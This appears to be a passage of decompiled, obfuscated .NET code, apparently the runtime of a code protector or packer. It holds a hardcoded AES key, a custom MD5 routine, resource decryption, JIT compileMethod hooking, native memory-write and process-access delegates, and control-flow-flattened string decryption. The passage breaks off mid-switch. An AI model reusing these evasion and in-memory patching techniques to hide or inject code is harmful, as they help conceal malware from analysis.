			\u0008.\u0002.\u0001();
			\u0002.\u0001 = typeof(\u0002).Assembly.ManifestModule;
		}
	}
}
namespace \u0004
{
	internal class \u0001
	{
		private delegate void \u0001(object o);

		internal class \u0002 : Attribute
		{
			internal class \u0001<\u0001>
			{
				public \u0001()
				{
					global::\u0008.\u0002.\u0001();
					base..ctor();
				}
			}

			[\u0002(typeof(\u0001[]))]
			public \u0002(object P_0)
			{
			}
		}

		internal class \u0003
		{
			[\u0002(typeof(\u0001[]))]
			internal static string \u0001(string \u0002, string \u0003)
			{
				byte[] bytes = Encoding.Unicode.GetBytes(\u0002);
				byte[] array = bytes;
				byte[] key = new byte[32]
				{
					82, 102, 104, 110, 32, 77, 24, 34, 118, 181,
					51, 17, 18, 51, 12, 109, 10, 32, 77, 24,
					34, 158, 161, 41, 97, 28, 118, 181, 5, 25,
					1, 88
				};
				byte[] iV = global::\u0004.\u0001.\u0002(Encoding.Unicode.GetBytes(\u0003));
				MemoryStream memoryStream = new MemoryStream();
				SymmetricAlgorithm symmetricAlgorithm = global::\u0004.\u0001.\u0001();
				symmetricAlgorithm.Key = key;
				symmetricAlgorithm.IV = iV;
				CryptoStream cryptoStream = new CryptoStream(memoryStream, symmetricAlgorithm.CreateEncryptor(), CryptoStreamMode.Write);
				cryptoStream.Write(array, 0, array.Length);
				cryptoStream.Close();
				return Convert.ToBase64String(memoryStream.ToArray());
			}
		}

		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		internal delegate uint \u0004(IntPtr classthis, IntPtr comp, IntPtr info, [MarshalAs(UnmanagedType.U4)] uint flags, IntPtr nativeEntry, ref uint nativeSizeOfCode);

		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate IntPtr \u0005();

		internal struct \u0006
		{
			internal bool \u0001;

			internal byte[] \u0002;
		}

		internal class \u0007
		{
			private BinaryReader m_\u0001;

			public \u0007(Stream P_0)
			{
				this.m_\u0001 = new BinaryReader(P_0);
			}

			[SpecialName]
			internal Stream \u0001()
			{
				return this.m_\u0001.BaseStream;
			}

			internal byte[] \u0001(int \u0002)
			{
				return this.m_\u0001.ReadBytes(\u0002);
			}

			internal int \u0001(byte[] \u0002, int \u0003, int \u0004)
			{
				return this.m_\u0001.Read(\u0002, \u0003, \u0004);
			}

			internal int \u0001()
			{
				return this.m_\u0001.ReadInt32();
			}

			internal void \u0001()
			{
				this.m_\u0001.Close();
			}
		}

		[UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
		private delegate IntPtr \u0008(IntPtr hModule, string lpName, uint lpType);

		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate IntPtr \u000e(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate int \u000f(IntPtr hProcess, IntPtr lpBaseAddress, [In][Out] byte[] buffer, uint size, out IntPtr lpNumberOfBytesWritten);

		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate int \u0010(IntPtr lpAddress, int dwSize, int flNewProtect, ref int lpflOldProtect);

		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate IntPtr \u0011(uint dwDesiredAccess, int bInheritHandle, uint dwProcessId);

		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate int \u0012(IntPtr ptr);

		[Flags]
		private enum \u0013
		{

		}

		private static bool m_\u0001;

		private static uint[] m_\u0002;

		private static byte[] m_\u0003;

		private static IntPtr m_\u0004;

		private static object m_\u0005;

		private static SortedList m_\u0006;

		private static int m_\u0007;

		internal static \u0004 \u0008;

		private static long m_\u000e;

		private static bool m_\u000f;

		private static int m_\u0010;

		private static bool m_\u0011;

		private static int[] m_\u0012;

		private static \u000f m_\u0013;

		[\u0002(typeof(\u0001[]))]
		private static bool \u0014;

		internal static Hashtable \u0015;

		private static bool \u0016;

		private static byte[] \u0017;

		private static Dictionary<int, int> \u0018;

		private static \u0011 \u0019;

		private static long \u001a;

		private static object \u001b;

		internal static Assembly \u001c;

		private static int \u001d;

		private static \u0008 \u001e;

		private static IntPtr \u001f;

		internal static RSACryptoServiceProvider \u007f;

		private static int \u0080;

		private static IntPtr \u0081;

		private static IntPtr \u0082;

		private static \u0012 \u0083;

		private static bool \u0084;

		private static \u0010 \u0086;

		internal static \u0004 \u0087;

		private static byte[] \u0088;

		private static \u000e \u0089;

		private static bool \u008a;

		[NonSerialized]
		internal static GetString \u0097;

		static \u0001()
		{
			Strings.CreateGetStringDelegate(typeof(global::\u0004.\u0001));
			global::\u0004.\u0001.m_\u0001 = false;
			\u001c = typeof(global::\u0004.\u0001).Assembly;
			global::\u0004.\u0001.m_\u0002 = new uint[64]
			{
				3614090360u, 3905402710u, 606105819u, 3250441966u, 4118548399u, 1200080426u, 2821735955u, 4249261313u, 1770035416u, 2336552879u,
				4294925233u, 2304563134u, 1804603682u, 4254626195u, 2792965006u, 1236535329u, 4129170786u, 3225465664u, 643717713u, 3921069994u,
				3593408605u, 38016083u, 3634488961u, 3889429448u, 568446438u, 3275163606u, 4107603335u, 1163531501u, 2850285829u, 4243563512u,
				1735328473u, 2368359562u, 4294588738u, 2272392833u, 1839030562u, 4259657740u, 2763975236u, 1272893353u, 4139469664u, 3200236656u,
				681279174u, 3936430074u, 3572445317u, 76029189u, 3654602809u, 3873151461u, 530742520u, 3299628645u, 4096336452u, 1126891415u,
				2878612391u, 4237533241u, 1700485571u, 2399980690u, 4293915773u, 2240044497u, 1873313359u, 4264355552u, 2734768916u, 1309151649u,
				4149444226u, 3174756917u, 718787259u, 3951481745u
			};
			global::\u0004.\u0001.m_\u0011 = false;
			\u0016 = false;
			global::\u0004.\u0001.m_\u0003 = new byte[0];
			\u007f = null;
			\u0018 = null;
			\u001b = new object();
			\u0088 = new byte[0];
			\u0017 = new byte[0];
			\u0082 = IntPtr.Zero;
			global::\u0004.\u0001.m_\u0004 = IntPtr.Zero;
			global::\u0004.\u0001.m_\u0005 = new string[0];
			global::\u0004.\u0001.m_\u0012 = new int[0];
			\u0080 = 1;
			\u008a = false;
			global::\u0004.\u0001.m_\u0006 = new SortedList();
			global::\u0004.\u0001.m_\u0007 = 0;
			\u001a = 0L;
			\u0087 = null;
			global::\u0004.\u0001.\u0008 = null;
			global::\u0004.\u0001.m_\u000e = 0L;
			\u001d = 0;
			\u0084 = false;
			global::\u0004.\u0001.m_\u000f = false;
			global::\u0004.\u0001.m_\u0010 = 0;
			\u0081 = IntPtr.Zero;
			\u0014 = false;
			\u0015 = new Hashtable();
			\u001e = null;
			\u0089 = null;
			global::\u0004.\u0001.m_\u0013 = null;
			\u0086 = null;
			\u0019 = null;
			\u0083 = null;
			\u001f = IntPtr.Zero;
			try
			{
				RSACryptoServiceProvider.UseMachineKeyStore = true;
			}
			catch
			{
			}
		}

		private void \u0001()
		{
		}

		internal static byte[] \u0001(byte[] \u0002)
		{
			uint[] array = new uint[16];
			int num = 448 - \u0002.Length * 8 % 512;
			uint num2 = (uint)((num + 512) % 512);
			if (num2 == 0)
			{
				num2 = 512u;
			}
			uint num3 = (uint)(\u0002.Length + num2 / 8 + 8);
			ulong num4 = (ulong)\u0002.Length * 8uL;
			byte[] array2 = new byte[num3];
			for (int i = 0; i < \u0002.Length; i++)
			{
				array2[i] = \u0002[i];
			}
			array2[\u0002.Length] |= 128;
			for (int num5 = 8; num5 > 0; num5--)
			{
				array2[num3 - num5] = (byte)((num4 >> (8 - num5) * 8) & 0xFF);
			}
			uint num6 = (uint)(array2.Length * 8) / 32u;
			uint num7 = 1732584193u;
			uint num8 = 4023233417u;
			uint num9 = 2562383102u;
			uint num10 = 271733878u;
			for (uint num11 = 0u; num11 < num6 / 16; num11++)
			{
				uint num12 = num11 << 6;
				for (uint num13 = 0u; num13 < 61; num13 += 4)
				{
					array[num13 >> 2] = (uint)((array2[num12 + (num13 + 3)] << 24) | (array2[num12 + (num13 + 2)] << 16) | (array2[num12 + (num13 + 1)] << 8) | array2[num12 + num13]);
				}
				uint num14 = num7;
				uint num15 = num8;
				uint num16 = num9;
				uint num17 = num10;
				\u0001(ref num7, num8, num9, num10, 0u, 7, 1u, array);
				\u0001(ref num10, num7, num8, num9, 1u, 12, 2u, array);
				\u0001(ref num9, num10, num7, num8, 2u, 17, 3u, array);
				\u0001(ref num8, num9, num10, num7, 3u, 22, 4u, array);
				\u0001(ref num7, num8, num9, num10, 4u, 7, 5u, array);
				\u0001(ref num10, num7, num8, num9, 5u, 12, 6u, array);
				\u0001(ref num9, num10, num7, num8, 6u, 17, 7u, array);
				\u0001(ref num8, num9, num10, num7, 7u, 22, 8u, array);
				\u0001(ref num7, num8, num9, num10, 8u, 7, 9u, array);
				\u0001(ref num10, num7, num8, num9, 9u, 12, 10u, array);
				\u0001(ref num9, num10, num7, num8, 10u, 17, 11u, array);
				\u0001(ref num8, num9, num10, num7, 11u, 22, 12u, array);
				\u0001(ref num7, num8, num9, num10, 12u, 7, 13u, array);
				\u0001(ref num10, num7, num8, num9, 13u, 12, 14u, array);
				\u0001(ref num9, num10, num7, num8, 14u, 17, 15u, array);
				\u0001(ref num8, num9, num10, num7, 15u, 22, 16u, array);
				global::\u0004.\u0001.\u0002(ref num7, num8, num9, num10, 1u, 5, 17u, array);
				global::\u0004.\u0001.\u0002(ref num10, num7, num8, num9, 6u, 9, 18u, array);
				global::\u0004.\u0001.\u0002(ref num9, num10, num7, num8, 11u, 14, 19u, array);
				global::\u0004.\u0001.\u0002(ref num8, num9, num10, num7, 0u, 20, 20u, array);
				global::\u0004.\u0001.\u0002(ref num7, num8, num9, num10, 5u, 5, 21u, array);
				global::\u0004.\u0001.\u0002(ref num10, num7, num8, num9, 10u, 9, 22u, array);
				global::\u0004.\u0001.\u0002(ref num9, num10, num7, num8, 15u, 14, 23u, array);
				global::\u0004.\u0001.\u0002(ref num8, num9, num10, num7, 4u, 20, 24u, array);
				global::\u0004.\u0001.\u0002(ref num7, num8, num9, num10, 9u, 5, 25u, array);
				global::\u0004.\u0001.\u0002(ref num10, num7, num8, num9, 14u, 9, 26u, array);
				global::\u0004.\u0001.\u0002(ref num9, num10, num7, num8, 3u, 14, 27u, array);
				global::\u0004.\u0001.\u0002(ref num8, num9, num10, num7, 8u, 20, 28u, array);
				global::\u0004.\u0001.\u0002(ref num7, num8, num9, num10, 13u, 5, 29u, array);
				global::\u0004.\u0001.\u0002(ref num10, num7, num8, num9, 2u, 9, 30u, array);
				global::\u0004.\u0001.\u0002(ref num9, num10, num7, num8, 7u, 14, 31u, array);
				global::\u0004.\u0001.\u0002(ref num8, num9, num10, num7, 12u, 20, 32u, array);
				\u0003(ref num7, num8, num9, num10, 5u, 4, 33u, array);
				\u0003(ref num10, num7, num8, num9, 8u, 11, 34u, array);
				\u0003(ref num9, num10, num7, num8, 11u, 16, 35u, array);
				\u0003(ref num8, num9, num10, num7, 14u, 23, 36u, array);
				\u0003(ref num7, num8, num9, num10, 1u, 4, 37u, array);
				\u0003(ref num10, num7, num8, num9, 4u, 11, 38u, array);
				\u0003(ref num9, num10, num7, num8, 7u, 16, 39u, array);
				\u0003(ref num8, num9, num10, num7, 10u, 23, 40u, array);
				\u0003(ref num7, num8, num9, num10, 13u, 4, 41u, array);
				\u0003(ref num10, num7, num8, num9, 0u, 11, 42u, array);
				\u0003(ref num9, num10, num7, num8, 3u, 16, 43u, array);
				\u0003(ref num8, num9, num10, num7, 6u, 23, 44u, array);
				\u0003(ref num7, num8, num9, num10, 9u, 4, 45u, array);
				\u0003(ref num10, num7, num8, num9, 12u, 11, 46u, array);
				\u0003(ref num9, num10, num7, num8, 15u, 16, 47u, array);
				\u0003(ref num8, num9, num10, num7, 2u, 23, 48u, array);
				\u0004(ref num7, num8, num9, num10, 0u, 6, 49u, array);
				\u0004(ref num10, num7, num8, num9, 7u, 10, 50u, array);
				\u0004(ref num9, num10, num7, num8, 14u, 15, 51u, array);
				\u0004(ref num8, num9, num10, num7, 5u, 21, 52u, array);
				\u0004(ref num7, num8, num9, num10, 12u, 6, 53u, array);
				\u0004(ref num10, num7, num8, num9, 3u, 10, 54u, array);
				\u0004(ref num9, num10, num7, num8, 10u, 15, 55u, array);
				\u0004(ref num8, num9, num10, num7, 1u, 21, 56u, array);
				\u0004(ref num7, num8, num9, num10, 8u, 6, 57u, array);
				\u0004(ref num10, num7, num8, num9, 15u, 10, 58u, array);
				\u0004(ref num9, num10, num7, num8, 6u, 15, 59u, array);
				\u0004(ref num8, num9, num10, num7, 13u, 21, 60u, array);
				\u0004(ref num7, num8, num9, num10, 4u, 6, 61u, array);
				\u0004(ref num10, num7, num8, num9, 11u, 10, 62u, array);
				\u0004(ref num9, num10, num7, num8, 2u, 15, 63u, array);
				\u0004(ref num8, num9, num10, num7, 9u, 21, 64u, array);
				num7 += num14;
				num8 += num15;
				num9 += num16;
				num10 += num17;
			}
			byte[] array3 = new byte[16];
			Array.Copy(BitConverter.GetBytes(num7), 0, array3, 0, 4);
			Array.Copy(BitConverter.GetBytes(num8), 0, array3, 4, 4);
			Array.Copy(BitConverter.GetBytes(num9), 0, array3, 8, 4);
			Array.Copy(BitConverter.GetBytes(num10), 0, array3, 12, 4);
			return array3;
		}

		private static void \u0001(ref uint \u0002, uint \u0003, uint \u0004, uint \u0005, uint \u0006, ushort \u0007, uint \u0008, uint[] \u000e)
		{
			\u0002 = \u0003 + \u0001(\u0002 + ((\u0003 & \u0004) | (~\u0003 & \u0005)) + \u000e[\u0006] + global::\u0004.\u0001.m_\u0002[\u0008 - 1], \u0007);
		}

		private static void \u0002(ref uint \u0002, uint \u0003, uint \u0004, uint \u0005, uint \u0006, ushort \u0007, uint \u0008, uint[] \u000e)
		{
			\u0002 = \u0003 + \u0001(\u0002 + ((\u0003 & \u0005) | (\u0004 & ~\u0005)) + \u000e[\u0006] + global::\u0004.\u0001.m_\u0002[\u0008 - 1], \u0007);
		}

		private static void \u0003(ref uint \u0002, uint \u0003, uint \u0004, uint \u0005, uint \u0006, ushort \u0007, uint \u0008, uint[] \u000e)
		{
			\u0002 = \u0003 + \u0001(\u0002 + (\u0003 ^ \u0004 ^ \u0005) + \u000e[\u0006] + global::\u0004.\u0001.m_\u0002[\u0008 - 1], \u0007);
		}

		private static void \u0004(ref uint \u0002, uint \u0003, uint \u0004, uint \u0005, uint \u0006, ushort \u0007, uint \u0008, uint[] \u000e)
		{
			\u0002 = \u0003 + \u0001(\u0002 + (\u0004 ^ (\u0003 | ~\u0005)) + \u000e[\u0006] + global::\u0004.\u0001.m_\u0002[\u0008 - 1], \u0007);
		}

		private static uint \u0001(uint \u0002, ushort \u0003)
		{
			return (\u0002 >> 32 - \u0003) | (\u0002 << (int)\u0003);
		}

		internal static bool \u0001()
		{
			if (!global::\u0004.\u0001.m_\u0011)
			{
				global::\u0004.\u0001.\u0001();
				global::\u0004.\u0001.m_\u0011 = true;
			}
			return \u0016;
		}

		internal static SymmetricAlgorithm \u0001()
		{
			SymmetricAlgorithm symmetricAlgorithm = null;
			if (global::\u0004.\u0001.\u0001())
			{
				return new AesCryptoServiceProvider();
			}
			try
			{
				return new RijndaelManaged();
			}
			catch
			{
				return (SymmetricAlgorithm)Activator.CreateInstance(\u0097(459), \u0097(564)).Unwrap();
			}
		}

		internal static void \u0001()
		{
			try
			{
				\u0016 = CryptoConfig.AllowOnlyFipsAlgorithms;
			}
			catch
			{
			}
		}

		internal static byte[] \u0002(byte[] \u0002)
		{
			if (!global::\u0004.\u0001.\u0001())
			{
				return new MD5CryptoServiceProvider().ComputeHash(\u0002);
			}
			return \u0001(\u0002);
		}

		internal static void \u0001(HashAlgorithm \u0002, Stream \u0003, uint \u0004, byte[] \u0005)
		{
			while (\u0004 != 0)
			{
				int num = ((\u0004 > (uint)\u0005.Length) ? \u0005.Length : ((int)\u0004));
				\u0003.Read(\u0005, 0, num);
				\u0001(\u0002, \u0005, 0, num);
				\u0004 -= (uint)num;
			}
		}

		internal static void \u0001(HashAlgorithm \u0002, byte[] \u0003, int \u0004, int \u0005)
		{
			\u0002.TransformBlock(\u0003, \u0004, \u0005, \u0003, \u0004);
		}

		internal static uint \u0001(uint \u0002, int \u0003, long \u0004, BinaryReader \u0005)
		{
			for (int i = 0; i < \u0003; i++)
			{
				\u0005.BaseStream.Position = \u0004 + (i * 40 + 8);
				uint num = \u0005.ReadUInt32();
				uint num2 = \u0005.ReadUInt32();
				\u0005.ReadUInt32();
				uint num3 = \u0005.ReadUInt32();
				if (num2 <= \u0002 && \u0002 < num2 + num)
				{
					return num3 + \u0002 - num2;
				}
			}
			return 0u;
		}

		public static void \u0001(RuntimeTypeHandle \u0002)
		{
			try
			{
				Type typeFromHandle = Type.GetTypeFromHandle(\u0002);
				if (\u0018 == null)
				{
					lock (\u001b)
					{
						Dictionary<int, int> dictionary = new Dictionary<int, int>();
						BinaryReader binaryReader = new BinaryReader(typeof(global::\u0004.\u0001).Assembly.GetManifestResourceStream(\u0097(637)));
						binaryReader.BaseStream.Position = 0L;
						byte[] array = binaryReader.ReadBytes((int)binaryReader.BaseStream.Length);
						binaryReader.Close();
						if (array.Length > 0)
						{
							int num = array.Length % 4;
							int num2 = array.Length / 4;
							byte[] array2 = new byte[array.Length];
							uint num3 = 0u;
							uint num4 = 0u;
							if (num > 0)
							{
								num2++;
							}
							uint num5 = 0u;
							for (int i = 0; i < num2; i++)
							{
								int num6 = i * 4;
								uint num7 = 255u;
								int num8 = 0;
								if (i == num2 - 1 && num > 0)
								{
									num4 = 0u;
									for (int j = 0; j < num; j++)
									{
										if (j > 0)
										{
											num4 <<= 8;
										}
										num4 |= array[^(1 + j)];
									}
								}
								else
								{
									num5 = (uint)num6;
									num4 = (uint)((array[num5 + 3] << 24) | (array[num5 + 2] << 16) | (array[num5 + 1] << 8) | array[num5]);
								}
								num3 = num3;
								num3 += global::\u0004.\u0001.\u0002(num3);
								if (i == num2 - 1 && num > 0)
								{
									uint num9 = num3 ^ num4;
									for (int k = 0; k < num; k++)
									{
										if (k > 0)
										{
											num7 <<= 8;
											num8 += 8;
										}
										array2[num6 + k] = (byte)((num9 & num7) >> num8);
									}
								}
								else
								{
									uint num10 = num3 ^ num4;
									array2[num6] = (byte)(num10 & 0xFF);
									array2[num6 + 1] = (byte)((num10 & 0xFF00) >> 8);
									array2[num6 + 2] = (byte)((num10 & 0xFF0000) >> 16);
									array2[num6 + 3] = (byte)((num10 & 0xFF000000u) >> 24);
								}
							}
							array = array2;
							array2 = null;
							int num11 = array.Length / 8;
							\u0007 obj = new \u0007(new MemoryStream(array));
							for (int l = 0; l < num11; l++)
							{
								int key = obj.\u0001();
								int value = obj.\u0001();
								dictionary.Add(key, value);
							}
							obj.\u0001();
						}
						\u0018 = dictionary;
					}
				}
				FieldInfo[] fields = typeFromHandle.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField);
				foreach (FieldInfo fieldInfo in fields)
				{
					int metadataToken = fieldInfo.MetadataToken;
					int num12 = \u0018[metadataToken];
					bool flag = (num12 & 0x40000000) > 0;
					num12 &= 0x3FFFFFFF;
					MethodInfo methodInfo = (MethodInfo)typeof(global::\u0004.\u0001).Module.ResolveMethod(num12, typeFromHandle.GetGenericArguments(), new Type[0]);
					if (methodInfo.IsStatic)
					{
						fieldInfo.SetValue(null, Delegate.CreateDelegate(fieldInfo.FieldType, methodInfo));
						continue;
					}
					ParameterInfo[] parameters = methodInfo.GetParameters();
					int num13 = parameters.Length + 1;
					Type[] array3 = new Type[num13];
					if (methodInfo.DeclaringType.IsValueType)
					{
						array3[0] = methodInfo.DeclaringType.MakeByRefType();
					}
					else
					{
						array3[0] = typeof(object);
					}
					for (int n = 0; n < parameters.Length; n++)
					{
						array3[n + 1] = parameters[n].ParameterType;
					}
					DynamicMethod dynamicMethod = new DynamicMethod(string.Empty, methodInfo.ReturnType, array3, typeFromHandle, skipVisibility: true);
					ILGenerator iLGenerator = dynamicMethod.GetILGenerator();
					for (int num14 = 0; num14 < num13; num14++)
					{
						switch (num14)
						{
						case 0:
							iLGenerator.Emit(OpCodes.Ldarg_0);
							break;
						case 1:
							iLGenerator.Emit(OpCodes.Ldarg_1);
							break;
						case 2:
							iLGenerator.Emit(OpCodes.Ldarg_2);
							break;
						case 3:
							iLGenerator.Emit(OpCodes.Ldarg_3);
							break;
						default:
							iLGenerator.Emit(OpCodes.Ldarg_S, num14);
							break;
						}
					}
					iLGenerator.Emit(OpCodes.Tailcall);
					iLGenerator.Emit(flag ? OpCodes.Callvirt : OpCodes.Call, methodInfo);
					iLGenerator.Emit(OpCodes.Ret);
					fieldInfo.SetValue(null, dynamicMethod.CreateDelegate(typeFromHandle));
				}
			}
			catch (Exception)
			{
			}
		}

		private static uint \u0001(uint \u0002)
		{
			return (uint)\u0097(690).Length;
		}

		private static uint \u0002(uint \u0002)
		{
			return 0u;
		}

		internal static void \u0002()
		{
		}

		[\u0002(typeof(\u0001[]))]
		internal static string \u0001(int \u0002)
		{
			int num = 278;
			byte[] array2 = default(byte[]);
			int num18 = default(int);
			int num17 = default(int);
			byte[] array6 = default(byte[]);
			byte[] array5 = default(byte[]);
			byte[] array = default(byte[]);
			uint num35 = default(uint);
			uint num30 = default(uint);
			uint num20 = default(uint);
			uint num21 = default(uint);
			uint num4 = default(uint);
			int num33 = default(int);
			byte[] array3 = default(byte[]);
			uint num31 = default(uint);
			int num19 = default(int);
			int num24 = default(int);
			\u0007 obj = default(\u0007);
			int num32 = default(int);
			int num38 = default(int);
			string result = default(string);
			int num36 = default(int);
			byte[] array7 = default(byte[]);
			byte[] array4 = default(byte[]);
			Stream stream = default(Stream);
			SymmetricAlgorithm symmetricAlgorithm = default(SymmetricAlgorithm);
			uint num25 = default(uint);
			int num29 = default(int);
			int num23 = default(int);
			int num26 = default(int);
			int num34 = default(int);
			uint num22 = default(uint);
			int num27 = default(int);
			CryptoStream cryptoStream = default(CryptoStream);
			ICryptoTransform transform = default(ICryptoTransform);
			int num28 = default(int);
			while (true)
			{
				int num2 = num;
				while (true)
				{
					switch (num2)
					{
					case 116:
						array2[2] = 127;
						num2 = 108;
						continue;
					case 317:
						array2[4] = (byte)num18;
						num2 = 230;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 114:
						num17 = 195 + 23;
						num2 = 256;
						continue;
					case 407:
						array6[3] = array5[1];
						num2 = 44;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							num2 = 71;
						}
						continue;
					case 142:
						array[24] = (byte)num17;
						num2 = 382;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 156:
						array[17] = (byte)num17;
						num2 = 413;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 88:
						array2[9] = 158;
						num2 = 122;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 91:
						array2[11] = (byte)num18;
						num = 252;
						break;
					case 218:
						array6[11] = array5[5];
						num2 = 313;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 27:
						array[2] = 142;
						num2 = 231;
						if (!global::\u0004.\u0001.\u0002())
						{
							num2 = 113;
						}
						continue;
					case 189:
						array[4] = 76;
						num2 = 57;
						continue;
					case 395:
						num35 = num30 ^ num20;
						num2 = 259;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 351:
						if (array5.Length > 0)
						{
							num2 = 13;
							if (global::\u0004.\u0001.\u0002())
							{
								num2 = 295;
							}
							continue;
						}
						goto case 242;
					case 314:
						num30 += num21;
						num2 = 50;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 154:
						num17 = 174 - 58;
						num2 = 282;
						continue;
					case 221:
						num17 = 68 + 4;
						num = 163;
						break;
					case 349:
						num17 = 11 + 110;
						num2 = 384;
						continue;
					case 280:
						num18 = 200 - 66;
						num2 = 377;
						continue;
					case 33:
						num30 = num4;
						num2 = 149;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 388:
						array6[9] = array5[4];
						num2 = 218;
						continue;
					case 24:
						array2[4] = 190;
						num2 = 72;
						continue;
					case 406:
						array[5] = (byte)num17;
						num2 = 121;
						continue;
					case 369:
						array2[2] = 206;
						num = 116;
						break;
					case 269:
						num17 = 211 - 70;
						num2 = 64;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 350:
						array[20] = 127;
						num2 = 54;
						continue;
					case 184:
						num33++;
						num2 = 66;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 390:
						array[8] = (byte)num17;
						num2 = 303;
						continue;
					case 193:
						array3 = array;
						num2 = 248;
						continue;
					case 180:
						array[11] = 101;
						num2 = 250;
						continue;
					case 383:
						array2[6] = 87;
						num2 = 79;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 126:
						num17 = 201 - 67;
						num2 = 160;
						continue;
					case 21:
						num18 = 89 + 115;
						num2 = 360;
						continue;
					case 251:
						num31 = num30 ^ num20;
						num2 = 210;
						continue;
					case 235:
						array[24] = (byte)num17;
						num2 = 144;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 311:
						array[30] = (byte)num17;
						num = 131;
						break;
					case 305:
						array2[11] = (byte)num18;
						num2 = 124;
						if (global::\u0004.\u0001.\u0002())
						{
							num2 = 229;
						}
						continue;
					case 207:
						if (num19 == num24 - 1)
						{
							num2 = 329;
							continue;
						}
						goto case 147;
					case 14:
						obj = new \u0007((Stream)\u0001(\u001c, \u0097(727)));
						num2 = 70;
						continue;
					case 415:
						num32++;
						num2 = 130;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							num2 = 178;
						}
						continue;
					case 212:
						num17 = 165 + 13;
						num2 = 300;
						continue;
					case 56:
						array[31] = (byte)num17;
						num = 133;
						break;
					case 141:
						array[28] = 101;
						num2 = 365;
						continue;
					case 147:
						num30 += num21;
						num2 = 40;
						continue;
					case 344:
						num18 = 181 - 60;
						num2 = 5;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 150:
						array[14] = (byte)num17;
						num2 = 341;
						if (global::\u0004.\u0001.\u0004() != null)
						{
							num2 = 142;
						}
						continue;
					case 303:
						num17 = 83 + 18;
						num2 = 325;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 217:
						num18 = 216 - 72;
						num2 = 145;
						continue;
					case 348:
						array[26] = (byte)num17;
						num2 = 257;
						continue;
					case 352:
						array[10] = (byte)num17;
						num2 = 400;
						continue;
					case 340:
						array2[6] = (byte)num18;
						num2 = 204;
						if (global::\u0004.\u0001.\u0004() != null)
						{
							num2 = 86;
						}
						continue;
					case 94:
						array[6] = 95;
						num2 = 366;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 162:
						array[10] = 125;
						num2 = 333;
						continue;
					case 359:
						num17 = 55 + 69;
						num2 = 406;
						continue;
					case 188:
						num17 = 64 + 35;
						num2 = 301;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 103:
						array[30] = (byte)num17;
						num2 = 354;
						continue;
					case 333:
						array[11] = 75;
						num2 = 90;
						if (global::\u0004.\u0001.\u0002())
						{
							num2 = 180;
						}
						continue;
					case 260:
						array[24] = (byte)num17;
						num2 = 389;
						continue;
					case 414:
						array[20] = (byte)num17;
						num2 = 350;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 100:
						array2[14] = (byte)num18;
						num2 = 200;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 353:
						array[8] = (byte)num17;
						num2 = 107;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 223:
						array5 = (byte[])global::\u0004.\u0001.\u0004(global::\u0004.\u0001.\u0003((object)\u001c));
						num2 = 86;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 358:
						array[30] = 115;
						num2 = 154;
						if (!global::\u0004.\u0001.\u0002())
						{
							num2 = 127;
						}
						continue;
					case 28:
						array2[10] = 159;
						num2 = 164;
						continue;
					case 11:
						array[8] = 162;
						num2 = 85;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							num2 = 401;
						}
						continue;
					case 164:
						array2[10] = 151;
						num2 = 47;
						continue;
					case 165:
						try
						{
							global::\u0004.\u0001.\u0004();
							int num37 = 1;
							if (!global::\u0004.\u0001.\u0002())
							{
								goto IL_0cf3;
							}
							goto IL_0cf5;
							IL_0cf3:
							num37 = num38;
							goto IL_0cf5;
							IL_0cf5:
							while (true)
							{
								switch (num37)
								{
								case 1:
									goto IL_0d04;
								case 0:
									break;
								}
								break;
								IL_0d04:
								result = (string)global::\u0004.\u0001.\u0001(global::\u0004.\u0001.\u0003(), (object)\u0088, \u0002 + 4, num36);
								num37 = 0;
								if (global::\u0004.\u0001.\u0002())
								{
									continue;
								}
								goto IL_0cf3;
							}
						}
						catch
						{
							int num39 = 0;
							if (global::\u0004.\u0001.\u0004() == null)
							{
								num39 = 0;
							}
							switch (num39)
							{
							}
							goto case 17;
						}
						return result;
					case 271:
						num17 = 121 - 66;
						num2 = 143;
						continue;
					case 110:
						array[6] = (byte)num17;
						num2 = 94;
						continue;
					case 4:
						if (num33 > 0)
						{
							num2 = 53;
							continue;
						}
						goto case 387;
					case 75:
						array[23] = 156;
						num2 = 54;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							num2 = 343;
						}
						continue;
					case 422:
						array[1] = 204;
						num = 114;
						break;
					case 237:
						num17 = 185 - 61;
						num = 328;
						break;
					case 146:
						array7 = new byte[array4.Length];
						num2 = 167;
						continue;
